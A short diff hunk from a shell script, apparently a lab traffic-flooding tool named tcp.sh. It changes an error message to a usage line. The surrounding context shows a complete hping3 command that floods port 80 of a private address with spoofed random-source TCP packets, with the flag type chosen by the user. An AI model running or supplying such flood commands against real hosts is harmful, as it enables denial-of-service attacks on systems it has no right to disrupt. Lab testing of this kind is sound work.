@@ -19,5 +19,5 @@ then
     echo "START RANDOM SOURCE"
     sudo hping3 -$1 --flood --destport 80 --rand-source 10.1.5.2 > /dev/null
 else
-    echo "YOU NEED TO SPECIFY AT LEAST THE FLAG: S,R,A,F,X"
+    echo "Usage: ./tcp.sh <S,R,A,F,X> <SPOOF IP>"    
 fi
